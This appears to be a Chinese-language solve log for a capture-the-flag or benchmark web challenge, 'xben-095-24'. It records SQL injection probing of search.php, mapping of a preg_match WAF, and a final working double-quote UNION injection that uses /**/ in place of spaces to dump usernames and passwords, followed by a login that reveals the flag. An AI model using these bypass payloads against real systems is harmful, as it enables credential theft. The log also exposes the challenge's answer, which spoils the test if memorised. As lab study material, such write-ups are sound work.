# xben-095-24 · 探索记录（未解）

对应题解：暂无（本题未拿到 flag）

## 结论

PHPAbUsers（PHP）。`search.php` 只做 `username` 存在性查询：`admin` → `User exists: admin`；带 `'` 与 `--`/`AND` 组合时被 WAF 拦成 `some item is filtered!`；登录 `login.php` 只有 `Error!`，没有可用凭据。未拿到 flag。

## 尝试过程

- `POST /search.php username=admin` → `User exists: admin`。
- `username=admin'`、`admin'#` → `No results`（引号改变了查询，但未报错）。
- `admin' AND 1=1-- -`、`' UNION SELECT ...` → `some item is filtered!`（WAF）。
- `admin'||1#` 之类也是 `No results`。

## 说明

本文件只记录实际做过的请求与判据；没有验证过的猜想不写进结论。

## 补充：2026-10-28 本轮

- `search.php` 的过滤规律（逐 token 探测）：
  - `admin` → `User exists: admin`
  - `admin'`、`admin'#`、`admin'/*`、`admin'||`、`admin'%` → `No results`
  - `admin' `（引号+空格）、`admin'-- -`、`admin' OR`、`admin' AND` → `some item is filtered!`
  说明 WAF 拦的是「引号后接空白/关键字」这一类，`||`、`/*`、`%` 放行。
- 但所有放行的注入都只得到 `No results`（同一条 `admin` 能查到，说明查询本身没被破坏成多行）。
- `username[]=admin`（数组）触发 `preg_match() expects parameter 2 to be string` 警告，
  证实过滤函数是 `preg_match`，但没有可用的回显注入。
- `login.php` 只有 `Error!`，无可用凭据；数组参数也只回 `Error`。

## 补充：2026-10-28（新 token 场次）

- 逐 token 复测，WAF 规则与上一轮一致：`'` 后接空格/`--`/`OR`/`AND`/`LIMIT` → `some item is filtered!`；
  `'` 后接 `#`、`/*`、`%`、`|`、`-` → `No results`（放行但无匹配）。
- `admin'/**/UNION/**/SELECT/**/1--`、`/**/` 分隔的关键字全部 `No results`，
  `#`/`--%20`/`/*` 三种结尾都试过，均无回显差异——结合 `admin'` 单独查询也是 `No results`，
  判断查询是参数化的，WAF 只是表层过滤，不存在可用的 SQL 注入。
- `login.php` 仍然只有 `Error!`；未找到其它入口。

## 补充：2026-10-28（新 token 场次）

- `search.php` 的 `username` 用 `preg_match` 过滤两次（第 19、22 行）；
  传数组会打印两条 `preg_match() expects parameter 2 to be string, array given` 后仍返回 `No results`。
- 引号后的空白/关键字被 WAF 拦；`#`、`/*`、`%`、`||` 放行但一律 `No results`，
  连 `admin'` 本身也是 `No results` → 说明查询对引号做了转义（参数化），WAF 只是外层。
- 目录/页面只有 `index.php`、`login.php`、`search.php`；`login.php` 任意输入都只回 `Error!`。
- 结论：本场未找到可用的注入或凭据。

## 更正与解出（2026-10-28）

上一节「参数化」的判断是错的：**只有单引号被转义，双引号没有**，查询用的是双引号。

```text
admin"#                                        → User exists: admin
admin"/**/or/**/1=1#                           → User exists: admin
admin"/**/union/**/select/**/1,@@version,3#    → User exists: 5.7.15
admin"/**/union/**/select/**/1,group_concat(concat_ws(0x3a,id,username,password)),3/**/from/**/users#
                                               → User exists: 1:admin:ThisIsBestPassword
```

- 列数 3，第 2 列回显；`/**/` 代替空格绕过 WAF 的 `and`/`or`/空格过滤，`#` 收尾。
- `admin:ThisIsBestPassword` 登录 `login.php`，响应正文直接给出
  `Congratz, flag is flag{14f3fa70-6132-4570-985c-f9dfcdc6db26}`。
- 教训：单引号被转义 ≠ 参数化，必须把双引号也单独测一次。
